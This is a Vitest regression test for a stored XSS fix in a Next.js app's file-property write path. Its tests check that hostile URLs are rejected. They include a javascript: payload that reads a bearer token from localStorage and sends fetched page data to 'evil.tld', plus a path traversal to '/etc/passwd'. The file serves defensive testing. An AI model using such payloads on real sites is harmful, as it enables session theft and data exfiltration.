import { beforeEach, describe, expect, it, vi } from "vitest";

/**
 * B52 - stored XSS: the FILES property value is free-form JSON and
 * `setPropertyValueAction` stored it without any URL validation. The write
 * path now accepts only the app's own `/api/files/...` asset URLs, so a
 * hostile file URL never reaches the table in the first place.
 *
 * Only prisma, auth, permissions and the cache are mocked; the action's own
 * validation runs for real.
 */

const db = vi.hoisted(() => ({
  pageFindUnique: vi.fn(),
  valueUpsert: vi.fn(),
  activityCreate: vi.fn(),
}));
const auth = vi.hoisted(() => ({ requireUser: vi.fn() }));
const perm = vi.hoisted(() => ({ getWorkspaceAccess: vi.fn(), canEditContent: vi.fn() }));

vi.mock("@/lib/db", () => ({
  prisma: {
    page: { findUnique: db.pageFindUnique },
    propertyValue: { upsert: db.valueUpsert },
    activity: { create: db.activityCreate },
  },
}));
vi.mock("@/lib/auth", () => ({ requireUser: auth.requireUser }));
vi.mock("@/lib/permissions", () => ({
  getWorkspaceAccess: perm.getWorkspaceAccess,
  canEditContent: perm.canEditContent,
}));
vi.mock("next/cache", () => ({ revalidatePath: vi.fn() }));

import { setPropertyValueAction } from "./database";

beforeEach(() => {
  vi.clearAllMocks();
  db.pageFindUnique.mockResolvedValue({
    id: "db1",
    workspaceId: "ws1",
    type: "DATABASE",
    schemaLocked: false,
  });
  auth.requireUser.mockResolvedValue({ id: "u1" });
  perm.getWorkspaceAccess.mockResolvedValue({ role: "MEMBER" });
  perm.canEditContent.mockReturnValue(true);
  db.valueUpsert.mockResolvedValue({});
  db.activityCreate.mockResolvedValue({});
});

describe("setPropertyValueAction - FILES write-path URL validation", () => {
  it("refuses a stored javascript: file URL", async () => {
    const result = await setPropertyValueAction("row1", "p1", {
      files: [{ name: "Q3 Report", url: "javascript:alert(document.domain)" }],
    });
    expect(result).toEqual({ error: "That file link is not allowed." });
    expect(db.valueUpsert).not.toHaveBeenCalled();
  });

  it("refuses the exfiltration payload from the finding", async () => {
    const result = await setPropertyValueAction("row1", "p1", {
      files: [
        {
          name: "Q3 Report",
          url:
            'javascript:fetch("/api/v1/pages",{headers:{Authorization:"Bearer "+localStorage.getItem("t")}}).then(r=>r.text()).then(t=>fetch("https://evil.tld/?d="+btoa(t)))',
        },
      ],
    });
    expect(result).toEqual({ error: "That file link is not allowed." });
    expect(db.valueUpsert).not.toHaveBeenCalled();
  });

  it("refuses an absolute URL that is not the app's own asset path", async () => {
    const result = await setPropertyValueAction("row1", "p1", {
      files: [{ name: "x", url: "https://evil.example/x.pdf" }],
    });
    expect(result).toEqual({ error: "That file link is not allowed." });
    expect(db.valueUpsert).not.toHaveBeenCalled();
  });

  it("refuses a traversal attempt inside the asset path", async () => {
    const result = await setPropertyValueAction("row1", "p1", {
      files: [{ name: "x", url: "/api/files/ws1/../../etc/passwd" }],
    });
    expect(result).toEqual({ error: "That file link is not allowed." });
    expect(db.valueUpsert).not.toHaveBeenCalled();
  });

  it("writes an app-owned file URL", async () => {
    const value = { files: [{ name: "q3.pdf", url: "/api/files/ws1/q3.pdf" }] };
    const result = await setPropertyValueAction("row1", "p1", value);
    expect(result).toEqual({ ok: true });
    expect(db.valueUpsert).toHaveBeenCalledWith({
      where: { propertyId_pageId: { propertyId: "p1", pageId: "row1" } },
      create: { propertyId: "p1", pageId: "row1", value },
      update: { value },
    });
  });

  it("leaves the other property types untouched", async () => {
    const value = { text: "hello" };
    const result = await setPropertyValueAction("row1", "p1", value);
    expect(result).toEqual({ ok: true });
    expect(db.valueUpsert).toHaveBeenCalled();
  });

  it("writes an empty FILES value", async () => {
    const result = await setPropertyValueAction("row1", "p1", { files: [] });
    expect(result).toEqual({ ok: true });
    expect(db.valueUpsert).toHaveBeenCalled();
  });
});
